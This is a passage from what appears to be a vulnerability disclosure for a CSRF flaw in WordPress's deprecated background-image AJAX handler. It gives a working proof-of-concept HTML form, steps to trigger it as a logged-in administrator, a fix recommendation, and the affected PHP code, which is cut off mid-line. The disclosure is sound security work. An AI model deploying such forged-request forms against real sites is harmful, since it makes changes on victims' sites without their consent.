The `size` parameter can also be changed to `thumbnail`, `medium`, `large` or `full`.\n\n```html\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://[WP]/wp-admin/admin-ajax.php\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"attachment_id\" value=\"5\" /\u003e\n      \u003cinput type=\"hidden\" name=\"action\" value=\"set-background-image\" /\u003e\n      \u003cinput type=\"hidden\" name=\"size\" value=\"thumbnail\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nThen log on to the blog as an administrator, open the file (with the same web browser used to login) and click the `Submit request` button. Then go the homepage of the blog and notice that the background image has been changed.\n\n## Recommendations\n\nGiven that the method has been deprecated and replaced with the `ajax_background_add` one which has the correct checks (both CSRF and authorisation), it would be recommended to remove the `wp_set_background_image` function all together, or at least not register it in the `wp_ajax_` hook.\n\n## Affected Code\n\nIn wp-admin/includes/class-custom-background.php\n\n```php\n// Unused since 3.5.0.\nadd_action( 'wp_ajax_set-background-image', array( $this, 'wp_set_background_image' ) );\n\n/**\n * @since 3.4.0\n * @deprecated 3.5.0\n */\npublic function wp_set_background_image() {\n\tif ( !
